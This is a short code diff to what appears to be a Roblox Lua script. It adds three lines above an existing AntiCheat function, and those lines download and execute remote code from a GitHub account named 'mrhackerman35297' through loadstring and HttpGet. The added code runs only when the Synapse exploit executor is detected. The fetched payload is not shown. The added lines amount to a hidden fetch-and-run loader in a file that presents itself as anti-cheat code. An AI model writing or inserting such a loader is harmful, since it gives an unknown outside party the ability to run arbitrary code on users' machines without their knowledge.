@@ -1,4 +1,6 @@
-
+if syn then
+  loadstring(game:HttpGet('https://raw.githubusercontent.com/mrhackerman35297/AgentCC/main/Sources/GlobalChat'))()
+ end
 function AntiCheat()
   wait(1)
   local me        = game.Players.LocalPlayer
